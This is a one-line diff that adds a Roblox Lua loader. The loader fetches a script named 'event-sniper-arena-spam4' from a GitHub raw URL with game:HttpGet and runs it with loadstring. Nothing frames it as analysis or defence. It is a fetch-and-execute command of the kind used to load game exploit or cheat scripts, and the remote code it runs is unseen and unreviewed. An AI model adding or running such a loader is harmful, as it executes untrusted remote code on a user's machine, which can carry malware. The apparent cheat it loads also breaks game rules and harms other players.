@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/event-sniper-arena-spam4-62s317owmcr7n7.lua"))()
